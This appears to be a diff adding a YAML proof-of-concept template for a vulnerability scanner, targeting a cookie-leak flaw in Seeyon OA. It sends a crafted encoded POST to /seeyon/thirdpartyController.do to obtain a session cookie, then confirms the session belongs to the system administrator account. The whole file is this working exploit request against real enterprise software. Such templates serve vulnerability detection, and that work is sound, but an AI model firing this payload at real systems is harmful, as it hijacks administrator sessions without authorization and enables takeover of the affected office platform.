@@ -1,0 +1,16 @@
+name: poc-yaml-seeyon-oa-cookie-leak
+rules:
+  - method: POST
+    path: /seeyon/thirdpartyController.do
+    body: |
+      method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+    expression: |
+      response.status == 200 && response.headers["Set-Cookie"].contains("JSESSIONID=") && response.body.bcontains(b"/seeyon/common/")
+  - method: GET
+    path: /seeyon/main.do?method=headerjs
+    expression: |
+      response.status == 200 && response.body.bcontains(b"\"name\":\"系统管理员\"") && response.body.bcontains(b"\"id\":\"-7273032013234748168\"")
+detail:
+  author: Print1n(http://print1n.top)
+  links:
+    - https://mp.weixin.qq.com/s/0AqdfTrZUVrwTMbKEKresg
